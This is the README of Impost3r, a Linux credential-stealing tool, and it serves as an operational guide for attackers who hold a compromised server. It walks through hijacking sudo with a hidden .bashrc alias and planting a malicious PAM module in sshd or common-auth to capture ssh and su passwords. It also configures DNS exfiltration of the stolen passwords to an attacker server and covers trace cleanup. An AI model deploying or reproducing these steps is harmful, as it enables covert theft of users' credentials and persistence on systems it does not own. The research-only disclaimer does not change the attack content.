Impost3r is a tool that aim to steal many kinds of linux passwords(including ssh,su,sudo) written by C

Attackers can use Impost3r to make a trap to steal the legal user's passwords XD

> This tool is limited to security research and teaching, and the user bears all legal and related responsibilities caused by the use of this tool! The author does not assume any legal and related responsibilities!

## Features

- Automatically clean the track
- Use DNS to transfer the result
- Really hard for legal users can feel this attack

## Dependencies

- gcc

## Usage

Impost3r can be used to steal passwords including sudo, su, and ssh services. These three services can be roughly divided into two categories, sudo and ssh/su. I will discuss them below

## Steal sudo password

Only need ordinary user's privilege,and can only steal current user's password.

- First i will assume that attacker has controled a server and the privilege is ordinary user

- Check whether the ```.bash_profile``` file exists in the user's root directory. If the ```.bash_profile``` exists: then check whether ```.bashrc``` is actively loaded in the ```.bash_profile``` file, if it is actively loaded, skip this step and the next two checks, and continue with the subsequent operations.If ```.bashrc``` is not actively loaded, then skip the next two checks and remember **all operations for ```.bashrc``` in the following are replaced with operations for ```.bash_profile```!!!**; If ```.bash_profile``` does not exist: proceed to the next check.

- Check whether the ```.bash_login``` file exists in the user's root directory. If the ```.bash_login``` exists: then check whether ```.bashrc``` is actively loaded in the ```.bash_login``` file, if it is actively loaded, skip this step and the next check, and continue with the subsequent operations.If ```.bashrc``` is not actively loaded, then skip the next check and remember **all operations for ```.bashrc``` in the following are replaced with operations for ```.bash_login```!!!**; If ```.bash_login``` does not exist: proceed to the next check. 

- Check whether there is a ```.profile``` file in the user's root directory. If there is a ```.profile``` file: then check whether ```.bashrc``` is actively loaded in the ```.profile``` file (loaded by default), if it is actively loaded, skip this step and continue with the following operations.If it is not actively loaded, then **all operations for ```.bashrc``` in the following are replaced with operations for ```.profile```!!!**; if ```.profile``` does not exist, in principle, Impost3r will not be available, of course you can also depend on the situation to decide whether to generate ```.bash_profile``` or ```.profile``` file by yourself, and write loading code similar to the following to load ```.bashrc```

```
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi
```

- Then copy the original ```.bashrc``` file ```cp ～/.bashrc /tmp/```,and put this copy anywhere you like(In this case,i will use /tmp/)

- Edit the original ```.bashrc```,and add following sentences at the end of file(The param "/tmp/.impost3r" must be as the same as the following FILENAME you specified):

```
alias sudo='impost3r() {
if [ -f "/tmp/.impost3r" ]; then
/tmp/.impost3r "$@" && unalias sudo
else
unalias sudo;sudo "$@"
fi
}; impost3r'
```

- Then,save it and run ```source ~/.bashrc```

- After that,attacker needs to edit the source code of Impost3r```/sudo/main.h```:

```
/*
    Custom setting
*/
# define FILENAME "/tmp/.impost3r" \\Set the location where the Impost3r is on the server you attack.
# define BACKUP_ORI_FILENAME ".bashrc" \\Indicates whether the source user profile backed up by the attacker is .bashrc or .bash_profile or .profile or .bash_login
# define BACKUP_ORI_PATH "/tmp/.bashrc" \\Indicates the location of the source user profile backed up by the attacker on the target server
# define SAVE_OR_SEND 0 \\Set the method you want to apply when Impost3r get the password,(send to your server=0,save the result on the current server=1,default is send)

/*
    Send to server
*/
# define YOUR_DOMAIN ".com" \\Note that if you don’t want to buy a domain name to receive messages sent back by Impost3r and the target server implanted in Impost3r does not prohibit direct udp connections to port 53 of the dns server you control, then please use the default value for the domain name here
\\But if the target server implanted in Impost3r strictly restricts the outbound dns request, please change the value of YOUR_DOMAIN to the domain name you purchased, such as ".example.com", and meanwhile configure the NS record of this domain name to be the DNS server address you control, run Fdns on this DNS server.Change the value of REMOTE_ADDRESS below to the default dns address of the target server implanted in Impost3r(like 192.168.0.1), also change REMOTE_PORT to the default dns service's listening port(port 53 in most cases).
# define MAX_RESEND 30 \\Set the maximum times that Impost3r will try to resends stealing result to attacker's server
# define RESEND_INTERVAL 5 \\Set the interval of resending stealing result.
# define REMOTE_ADDRESS "192.168.0.12" \\Set the malicious server ip address that you want to receive stealing result
# define REMOTE_PORT 53 \\Set the malicious server port

/*
    Save to local
*/
# define SAVE_LOCATION "/tmp/.cache" \\Set the result file location if you want to save the result on the server
```
- Save the source code,and run ```make``` 

- Get the ```.impost3r``` file after compiling.

- Upload ```.impost3r``` file to the target server and put it under the FILENAME you specified.

- The last thing you should do is run a dns server service on your server(REMOTE_ADDRESS)'s port(REMOTE_PORT),and waiting for the bonus.

### Tips

- When Impost3r steal the sudo password successfully,it will automatically clean the traces it make on the target server.

- Impost3r can automatically determine whether the password entered by the user is the correct password, and will not clean itself and erase the trace until the user enters the correct password.

- Please use command ```sudo -v``` to check if the current user can use sudo command(if user is in the sudoers file) ,if user has no permission to use sudo command, Please do not use Impost3r!

## Steal ssh/su password

Stealing the ssh/su password is different from the sudo password stealing method above. You need root privilege.And this method can steal all user's password

The following uses Ubuntu as an example, Centos is similar,but the file locations mentioned may be slightly different

- First, assume that the attacker controls a server,and gets the root privilege

- Then edit the ```/ssh_su/main.h``` source code file of Impost3r

```
/*
    Custom setting
*/
# define SSH_OR_BOTH 0 \\Set stealing mode, 0 means only steal ssh password, 1 means steal ssh and su password, the default is 0 (the difference will be mentioned later)
# define SAVE_OR_SEND 0 \\Set the method you want to apply when Impost3r get the password,(send to your server=0,save the result on the current server=1,default is send)

/*
    Send to server
*/
# define YOUR_DOMAIN ".com" \\Note that if you don’t want to buy a domain name to receive messages sent back by Impost3r and the target server implanted in Impost3r does not prohibit direct udp connections to port 53 of the dns server you control, then please use the default value for the domain name here
\\But if the target server implanted in Impost3r strictly restricts the outbound dns request, please change the value of YOUR_DOMAIN to the domain name you purchased, such as ".example.com", and meanwhile configure the NS record of this domain name to be the DNS server address you control, run Fdns on this DNS server.Change the value of REMOTE_ADDRESS below to the default dns address of the target server implanted in Impost3r(like 192.168.0.1), also change REMOTE_PORT to the default dns service's listening port(port 53 in most cases).
# define MAX_RESEND 30 \\Set the maximum times that Impost3r will try to resends stealing result to attacker's server(This option is valid only when SSH_OR_BOTH is 0)
# define RESEND_INTERVAL 5 \\Set the interval of resending stealing result.(This option is valid only when SSH_OR_BOTH is 0)
# define REMOTE_ADDRESS "192.168.0.12" \\Set the malicious server ip address that you want to receive stealing result
# define REMOTE_PORT 53 \\Set the malicious server port

/*
    Save to local
*/
# define SAVE_LOCATION "/tmp/.sshsucache" \\Set the result file location if you want to save the result on the server
```

- After the modification is completed, save and execute ```make``` in the current directory

- Get the compiled file ```impost3r.so```

- Upload the compiled ```impost3r.so``` to the target server under ```/lib/x86_64-linux-gnu/security``` folder.(Different machines may have different folder names)

- Enter ```/etc/pam.d```, and then there are two cases. If the selected mode is to steal only the ssh password, then you need to execute ```vi sshd``` and add  at the following statement at the end of the file.（Just for Ubuntu, since this file on other systems based on linux may different, so I recommend you to get clear about how these rules work and add the following statement at the proper position）

```
auth optional impost3r.so
account optional impost3r.so
```

- Save and exit, restart the sshd service ```service sshd restart```

- But if you choose to steal the ssh and su passwords together, you need to execute ```vi common-auth```, add the same statement, save and exit and restart the sshd service

- Attacker starts the dns server program on his server, waiting for a legitimate user to log on the target server via ```ssh``` or use ```su``` to switch users to get the passwords.

### Tips

- In the case of stealing the ssh/su password, Impost3r cannot clear the traces due to permission reasons, so the attacker needs to clear them himself

- Please note that if you set to steal only ssh passwords, you can be guaranteed that you will receive the stolen results nearly 100 percent, but if you set to steal both, you will not be guaranteed that you will receive the results
100 percent. (Choose to save result locally won't have this problem,Only dns will)

- It is not recommended to steal the su password since the user's ssh password is the same as the su password.It's pretty enough to have ssh password i think.

- Impost3r won't steal the password if the passwaord is null,so check this scenario by yourself

## Attention

- The Dns server progran I use is [Fdns](https://github.com/deepdarkness/Fdns),and I change some params,you can find the changed source code under the ```Fdns``` folder,and use ```gcc -o dns main.c util.c``` to compile it by yourself(Remember changing the monitoring port in source code first).
- Before compiling Fdns, please check the ```YOUR_DOMAIN``` value in ```util.h``` to ensure that this value is consistent with the ```YOUR_DOMAIN``` value used when compiling the Impost3r program implanted on the server, otherwise it may cause the failure of the stealing.
- This porject is coding just for fun , the logic structure and code structure are not strict enough, please don't be so serious about it,and also welcome suggestions and prs.
